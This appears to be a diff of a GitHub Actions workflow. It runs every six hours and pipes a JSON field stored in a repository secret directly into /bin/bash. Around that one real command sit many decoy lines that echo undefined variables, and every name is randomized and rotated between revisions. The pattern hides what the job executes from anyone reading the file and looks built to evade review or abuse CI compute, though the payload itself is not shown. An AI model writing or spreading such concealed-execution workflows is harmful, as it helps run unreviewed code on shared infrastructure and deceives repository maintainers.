@@ -1,36 +1,25 @@
 name: xiuqingcx
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 2/6 * * *'
-
+    - cron: '34 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xiuqingcx
         env:
-          fh46: ${{ secrets.fh46 }}
+          dhmfa85: ${{ secrets.dhmfa85 }}
         run: |
-          echo $fh46 | jq -r .dofnf4184 | /bin/bash
-          echo $e0 | jq -r .favcu59612 | /bin/bash
-          echo $z603 | jq -r .fotj62176 | /bin/bash
-          echo $ztye28958 | jq -r .qi613 | /bin/bash
-          echo $y86124 | jq -r .mfwxk251 | /bin/bash
-          echo $s557 | jq -r .yt485 | /bin/bash
-          echo $sbxu1 | jq -r .ck27 | /bin/bash
-          echo $xfmv260 | jq -r .swl7 | /bin/bash
-          echo $ccn8095 | jq -r .g9 | /bin/bash
-          echo $o27 | jq -r .a353 | /bin/bash
-          echo $x07 | jq -r .envn328 | /bin/bash
-          echo $zy2329 | jq -r .wqtce4 | /bin/bash
-          echo $caoi0 | jq -r .nyopg2325 | /bin/bash
-          echo $fpl60 | jq -r .a46082 | /bin/bash
-          echo $kr574 | jq -r .vwn53 | /bin/bash
-          echo $sb233 | jq -r .n36559 | /bin/bash
-          echo $ll2 | jq -r .mmg9634 | /bin/bash
-          echo $ldkkb376 | jq -r .gcwq56 | /bin/bash
+          echo $dhmfa85 | jq -r .lxamt14 | /bin/bash
+          echo $m196 | jq -r .i2 | /bin/bash
+          echo $yygjq012 | jq -r .ywb79594 | /bin/bash
+          echo $mz7 | jq -r .mlsd55476 | /bin/bash
+          echo $yflwz759 | jq -r .wjfv585 | /bin/bash
+          echo $smail4 | jq -r .hy66832 | /bin/bash
+          echo $pivdp992 | jq -r .mnepo3 | /bin/bash
+          echo $th06 | jq -r .twaw112 | /bin/bash
+          echo $up87 | jq -r .euvn15539 | /bin/bash
+          echo $wr7383 | jq -r .lqeb432 | /bin/bash
 
